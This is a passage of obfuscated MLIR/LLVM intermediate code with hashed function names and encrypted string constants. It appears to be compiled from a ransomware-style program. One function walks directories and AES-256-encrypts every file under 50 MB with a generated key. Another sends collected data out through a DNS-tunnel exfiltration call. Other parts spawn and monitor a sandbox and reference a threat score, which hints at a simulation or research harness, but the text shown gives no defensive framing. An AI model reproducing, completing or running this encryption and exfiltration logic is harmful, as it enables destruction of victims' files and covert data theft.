    %52 = llvm.load %43 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %53 = llvm.call @array_append(%51, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %54 = llvm.bitcast %53 : !llvm.ptr to !llvm.ptr
    llvm.store %54, %39 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %55 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %56 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %57 = llvm.load %43 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %58 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @f_0218a827(%55, %56, %57, %58) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %59 = llvm.add %44, %21 : i64
    llvm.store %59, %42 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %60 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %61 = llvm.load %39 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %62 = llvm.call @array_len(%61) : (!llvm.ptr) -> i64
    %63 = llvm.call @string(%62) : (i64) -> !llvm.ptr
    %64 = llvm.call @jocky_str_concat(%60, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %65 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %66 = llvm.call @jocky_str_concat(%64, %65) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%66) : (!llvm.ptr) -> ()
    %67 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%67) : (!llvm.ptr) -> ()
    %68 = llvm.load %39 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.return %68 : !llvm.ptr
  }
  llvm.func @f_53decde1(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.90.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(32 : i32) : i32
    %4 = llvm.mlir.constant(0 : i64) : i64
    %5 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.99.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.98.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.100.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.101.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.102.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.103.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.104.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.91.enc" : !llvm.ptr
    %14 = llvm.mlir.constant(false) : i1
    %15 = llvm.mlir.addressof @".str.96.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.97.enc" : !llvm.ptr
    %17 = llvm.mlir.constant(1 : i64) : i64
    %18 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    %19 = llvm.mlir.constant(50 : i32) : i32
    %20 = llvm.mlir.constant(1024 : i32) : i32
    %21 = llvm.mlir.constant(65536 : i32) : i32
    %22 = llvm.mlir.addressof @".str.92.enc" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.93.enc" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.94.enc" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.95.enc" : !llvm.ptr
    %26 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg0, %26 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %27 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %28 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %29 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %30 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %31 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.call @crypto_generate_key(%3) : (i32) -> !llvm.ptr
    llvm.store %35, %27 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %36 {alignment = 4 : i64} : i32, !llvm.ptr
    %37 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %38 = llvm.load %26 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.call @array_len(%38) : (!llvm.ptr) -> i64
    %40 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %40 {alignment = 4 : i64} : i64, !llvm.ptr
    %41 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb13
    %42 = llvm.load %40 {alignment = 4 : i64} : !llvm.ptr -> i64
    %43 = llvm.icmp "slt" %42, %39 : i64
    llvm.cond_br %43, ^bb2, ^bb14
  ^bb2:  // pred: ^bb1
    %44 = llvm.bitcast %38 : !llvm.ptr to !llvm.ptr
    %45 = llvm.getelementptr %44[%42] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %46 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %46, %41 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %47 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %48 = llvm.load %41 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %49 = llvm.call @jocky_str_concat(%47, %48) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    %50 = llvm.load %41 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %51 = llvm.call @fs_list_files(%50, %14) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %51, %28 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %52 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %52 {alignment = 4 : i64} : i32, !llvm.ptr
    %53 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %53 {alignment = 4 : i64} : i32, !llvm.ptr
    %54 = llvm.load %28 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %55 = llvm.call @array_len(%54) : (!llvm.ptr) -> i64
    %56 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %56 {alignment = 4 : i64} : i64, !llvm.ptr
    %57 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb2, ^bb9
    %58 = llvm.load %56 {alignment = 4 : i64} : !llvm.ptr -> i64
    %59 = llvm.icmp "slt" %58, %55 : i64
    llvm.cond_br %59, ^bb4, ^bb10
  ^bb4:  // pred: ^bb3
    %60 = llvm.bitcast %54 : !llvm.ptr to !llvm.ptr
    %61 = llvm.getelementptr %60[%58] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %62 = llvm.load %61 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %62, %57 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %63 = llvm.load %41 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %64 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %65 = llvm.call @jocky_str_concat(%63, %64) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %66 = llvm.load %57 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %67 = llvm.call @jocky_str_concat(%65, %66) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %67, %29 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %68 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %69 = llvm.call @fs_file_size(%68) : (!llvm.ptr) -> i64
    llvm.store %69, %30 {alignment = 4 : i64} : i64, !llvm.ptr
    %70 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %71 = llvm.sext %2 : i32 to i64
    %72 = llvm.icmp "sgt" %70, %71 : i64
    llvm.cond_br %72, ^bb5, ^bb6(%14 : i1)
  ^bb5:  // pred: ^bb4
    %73 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %74 = llvm.mul %19, %20 : i32
    %75 = llvm.mul %74, %20 : i32
    %76 = llvm.sext %75 : i32 to i64
    %77 = llvm.icmp "slt" %73, %76 : i64
    llvm.br ^bb6(%77 : i1)
  ^bb6(%78: i1):  // 2 preds: ^bb4, ^bb5
    llvm.cond_br %78, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %79 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.call @fs_read_file(%79) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %80, %31 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %81 = llvm.load %31 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %82 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %83 = llvm.ptrtoint %82 : !llvm.ptr to i32
    %84 = llvm.mlir.addressof @crypto_aes256_encrypt : !llvm.ptr
    %85 = llvm.call %84(%81, %83) : !llvm.ptr, (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %85, %32 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %86 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %87 = llvm.sext %21 : i32 to i64
    %88 = llvm.sdiv %86, %87 : i64
    %89 = llvm.sext %0 : i32 to i64
    %90 = llvm.add %88, %89 : i64
    llvm.store %90, %33 {alignment = 4 : i64} : i64, !llvm.ptr
    %91 = llvm.load %36 {alignment = 4 : i64} : !llvm.ptr -> i32
    %92 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %93 = llvm.sext %91 : i32 to i64
    %94 = llvm.add %93, %92 : i64
    %95 = llvm.trunc %94 : i64 to i32
    llvm.store %95, %36 {alignment = 4 : i64} : i32, !llvm.ptr
    %96 = llvm.load %37 {alignment = 4 : i64} : !llvm.ptr -> i32
    %97 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i64
    %98 = llvm.sext %96 : i32 to i64
    %99 = llvm.add %98, %97 : i64
    %100 = llvm.trunc %99 : i64 to i32
    llvm.store %100, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %101 = llvm.load %52 {alignment = 4 : i64} : !llvm.ptr -> i32
    %102 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %103 = llvm.sext %101 : i32 to i64
    %104 = llvm.add %103, %102 : i64
    %105 = llvm.trunc %104 : i64 to i32
    llvm.store %105, %52 {alignment = 4 : i64} : i32, !llvm.ptr
    %106 = llvm.load %53 {alignment = 4 : i64} : !llvm.ptr -> i32
    %107 = llvm.add %106, %0 : i32
    llvm.store %107, %53 {alignment = 4 : i64} : i32, !llvm.ptr
    %108 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %109 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %110 = llvm.getelementptr %23[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %111 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i64
    %112 = llvm.call @string(%111) : (i64) -> !llvm.ptr
    %113 = llvm.call @jocky_str_concat(%110, %112) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @provenance_record(%108, %109, %113) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %114 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %115 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %116 = llvm.load %57 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %117 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %118 = llvm.call @string(%117) : (i64) -> !llvm.ptr
    llvm.call @f_0218a827(%114, %115, %116, %118) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    llvm.br ^bb9
  ^bb9:  // pred: ^bb8
    %119 = llvm.add %58, %17 : i64
    llvm.store %119, %56 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb3
  ^bb10:  // pred: ^bb3
    %120 = llvm.load %53 {alignment = 4 : i64} : !llvm.ptr -> i32
    %121 = llvm.icmp "sgt" %120, %2 : i32
    llvm.cond_br %121, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %122 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %123 = llvm.load %53 {alignment = 4 : i64} : !llvm.ptr -> i32
    %124 = llvm.sext %123 : i32 to i64
    %125 = llvm.call @string(%124) : (i64) -> !llvm.ptr
    %126 = llvm.call @jocky_str_concat(%122, %125) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %127 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %128 = llvm.call @jocky_str_concat(%126, %127) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %129 = llvm.load %52 {alignment = 4 : i64} : !llvm.ptr -> i32
    %130 = llvm.sext %129 : i32 to i64
    %131 = llvm.call @string(%130) : (i64) -> !llvm.ptr
    %132 = llvm.call @jocky_str_concat(%128, %131) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %133 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %134 = llvm.call @jocky_str_concat(%132, %133) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%134) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    llvm.br ^bb13
  ^bb13:  // pred: ^bb12
    %135 = llvm.add %42, %17 : i64
    llvm.store %135, %40 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb14:  // pred: ^bb1
    %136 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%136) : (!llvm.ptr) -> ()
    %137 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    %138 = llvm.load %36 {alignment = 4 : i64} : !llvm.ptr -> i32
    %139 = llvm.sext %138 : i32 to i64
    %140 = llvm.call @string(%139) : (i64) -> !llvm.ptr
    %141 = llvm.call @jocky_str_concat(%137, %140) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %142 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %143 = llvm.call @jocky_str_concat(%141, %142) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%143) : (!llvm.ptr) -> ()
    %144 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %145 = llvm.load %37 {alignment = 4 : i64} : !llvm.ptr -> i32
    %146 = llvm.sext %145 : i32 to i64
    %147 = llvm.call @string(%146) : (i64) -> !llvm.ptr
    %148 = llvm.call @jocky_str_concat(%144, %147) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %149 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %150 = llvm.call @jocky_str_concat(%148, %149) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%150) : (!llvm.ptr) -> ()
    %151 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %152 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %153 = llvm.load %36 {alignment = 4 : i64} : !llvm.ptr -> i32
    %154 = llvm.sext %153 : i32 to i64
    %155 = llvm.call @string(%154) : (i64) -> !llvm.ptr
    %156 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @f_0218a827(%151, %152, %155, %156) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %157 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%157) : (!llvm.ptr) -> ()
    %158 = llvm.load %37 {alignment = 4 : i64} : !llvm.ptr -> i32
    llvm.return %158 : i32
  }
  llvm.func @f_4b0d211b() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.105.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.106.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.107.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.108.enc" : !llvm.ptr
    %6 = llvm.mlir.constant(256 : i32) : i32
    %7 = llvm.mlir.constant(1024 : i32) : i32
    %8 = llvm.mlir.constant(100 : i32) : i32
    %9 = llvm.mlir.constant(120000 : i32) : i32
    %10 = llvm.mlir.addressof @".str.109.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.110.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.111.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.112.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.113.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %16 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %20 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    %21 = llvm.mlir.addressof @sandbox_spawn : !llvm.ptr
    %22 = llvm.call %21(%19, %20) : !llvm.ptr, (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %22, %16 {alignment = 4 : i64} : i32, !llvm.ptr
    %23 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %24 = llvm.icmp "sgt" %23, %2 : i32
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %26 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %27 = llvm.sext %26 : i32 to i64
    %28 = llvm.call @string(%27) : (i64) -> !llvm.ptr
    %29 = llvm.call @jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %31 = llvm.mul %6, %7 : i32
    %32 = llvm.mul %31, %7 : i32
    %33 = llvm.sext %32 : i32 to i64
    %34 = llvm.mul %8, %7 : i32
    %35 = llvm.mul %34, %7 : i32
    %36 = llvm.sext %35 : i32 to i64
    %37 = llvm.mlir.addressof @sandbox_set_limits : !llvm.ptr
    %38 = llvm.call %37(%30, %33, %9, %36) : !llvm.ptr, (i32, i64, i32, i64) -> i1
    %39 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %40 = llvm.mlir.addressof @sandbox_monitor : !llvm.ptr
    %41 = llvm.call %40(%39) : !llvm.ptr, (i32) -> i32
    llvm.store %41, %17 {alignment = 4 : i64} : i32, !llvm.ptr
    %42 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %43 = llvm.mlir.addressof @sandbox_wait : !llvm.ptr
    %44 = llvm.call %43(%42) : !llvm.ptr, (i32) -> i32
    %45 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %46 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %47 = llvm.mlir.addressof @sandbox_export_trace : !llvm.ptr
    %48 = llvm.call %47(%45, %46) : !llvm.ptr, (i32, !llvm.ptr) -> i1
    %49 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    %50 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %51 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %52 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %53 = llvm.sext %52 : i32 to i64
    %54 = llvm.call @string(%53) : (i64) -> !llvm.ptr
    %55 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    llvm.call @f_0218a827(%50, %51, %54, %55) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %56 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%56) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_64c2918f() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.114.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.115.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.116.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @g_e47349ba : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.117.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.122.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.118.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.119.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.120.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.121.enc" : !llvm.ptr
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %17 = llvm.load %4 {alignment = 4 : i64} : !llvm.ptr -> i32
    %18 = llvm.sext %17 : i32 to i64
    %19 = llvm.call @string(%18) : (i64) -> !llvm.ptr
    %20 = llvm.call @jocky_str_concat(%16, %19) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %21 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %22 = llvm.call @jocky_str_concat(%20, %21) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %23 = llvm.load %6 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %24 = llvm.call @array_len(%23) : (!llvm.ptr) -> i64
    %25 = llvm.call @string(%24) : (i64) -> !llvm.ptr
    %26 = llvm.call @jocky_str_concat(%22, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %26, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %28 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.call @exfil_dns_tunnel(%27, %28) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %29, %14 {alignment = 4 : i64} : i32, !llvm.ptr
    %30 = llvm.load %14 {alignment = 4 : i64} : !llvm.ptr -> i32
    %31 = llvm.icmp "eq" %30, %2 : i32
    llvm.cond_br %31, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %32 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%32) : (!llvm.ptr) -> ()
    %33 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %34 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %35 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %36 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @f_0218a827(%33, %34, %35, %36) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %37 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    llvm.return
  }
  llvm.func @f_50877ae9() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.123.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.124.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.125.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @g_e47349ba : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.126.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.127.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.128.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.119.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.129.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.130.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.131.enc" : !llvm.ptr
    %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
